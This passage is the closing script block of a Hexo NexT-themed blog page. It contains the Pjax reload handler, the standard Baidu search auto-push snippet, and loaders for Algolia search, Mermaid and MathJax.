  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
